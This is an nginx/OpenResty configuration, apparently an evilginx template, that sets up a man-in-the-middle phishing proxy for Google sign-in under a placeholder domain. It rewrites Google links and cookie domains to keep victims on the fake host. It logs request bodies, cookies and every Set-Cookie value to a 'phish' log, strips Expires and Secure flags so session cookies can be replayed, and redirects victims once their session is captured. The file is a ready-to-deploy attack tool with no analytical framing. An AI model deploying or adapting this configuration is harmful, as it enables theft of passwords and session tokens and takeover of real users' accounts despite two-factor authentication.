log_format phish '{"remote_addr":"$remote_addr","time":"$time_local","host":"$http_host","request":"$request","status":"$status","referer":"$http_referer","ua":"$http_user_agent","conn":"$connection","cookies":"$http_cookie","set-cookies":"$set_cookies_all","body":"$request_body"}';

server {
	listen 80;
	listen 443 ssl;
	
	server_name accounts.{{PHISH_DOMAIN}};

	ssl_certificate /etc/letsencrypt/live/{{PHISH_DOMAIN}}/fullchain.pem;
	ssl_certificate_key /etc/letsencrypt/live/{{PHISH_DOMAIN}}/privkey.pem;

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
	ssl_prefer_server_ciphers on;
	ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';

	location / {
		proxy_pass https://accounts.google.com;
		proxy_cookie_domain google.com {{PHISH_DOMAIN}};
		proxy_redirect https://accounts.google.com/ https://accounts.{{PHISH_DOMAIN}}/;
		
		sub_filter 'https://accounts.google.com/signin/' 'https://accounts.{{PHISH_DOMAIN}}/signin/';
		sub_filter 'href="https://accounts.google.com' 'href="https://accounts.{{PHISH_DOMAIN}}';
		sub_filter_once off;
		sub_filter_types text/html application/json;

		proxy_set_header Accept-Encoding "";
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

		set_unescape_uri $token $arg_rt;
		set_unescape_uri $redir $arg_rc;
		set $set_cookies_all "";

		access_log /var/log/evilginx-google.log phish;

		header_filter_by_lua_block {
			function get_cookies()
				local cookies = ngx.header.set_cookie or {}
				if type(cookies) == "string" then
					cookies = {cookies}
				end
				return cookies
			end

			function add_cookie(cookie)
				local cookies = get_cookies()
				table.insert(cookies, cookie)
				ngx.header.set_cookie = cookies
			end

			function exists_cookie(cookie)
				local cookies = get_cookies()
				for i, val in ipairs(cookies) do
					if string.match(val, "^" .. cookie .. "=") ~= nil then
						return true
					end
				end
				return false
			end

			if ngx.var.redir ~= "" then add_cookie("rc=" .. ngx.escape_uri(ngx.var.redir) .. "; path=/") end
			if ngx.var.token ~= "" then add_cookie("rt=" .. ngx.escape_uri(ngx.var.token) .. "; path=/") end

			if ngx.var.http_cookie ~= nil then
				local c_rc = string.match(ngx.var.http_cookie, "rc=([^;]*)")
				local c_rt = string.match(ngx.var.http_cookie, "rt=([^;]*)")
				local c_rd = string.match(ngx.var.http_cookie, "rd=([^;]*)")

				if c_rt ~= nil and c_rc ~= nil then
					if exists_cookie(c_rt) or c_rd ~= nil then
						ngx.header.location = ngx.unescape_uri(c_rc)
						add_cookie("rd=true; path=/")
					end
				end
			end

			if not ngx.header.set_cookie then return end
			local cookies = ngx.header.set_cookie
			if not cookies then return end
			if type(cookies) ~= "table" then cookies = {cookies} end
			local newcookies = {}
			local allcookies = ""
			for i, val in ipairs(cookies) do
				val = string.gsub(val, ";[eE]xpires=[^;]*", "")
				val = string.gsub(val, ";[sS]ecure", "")
				table.insert(newcookies, val)
				if i>1 then allcookies = allcookies .. "||" end
				allcookies = allcookies .. val
			end
			ngx.header.set_cookie = newcookies
			ngx.var.set_cookies_all = allcookies
		}
	}
}
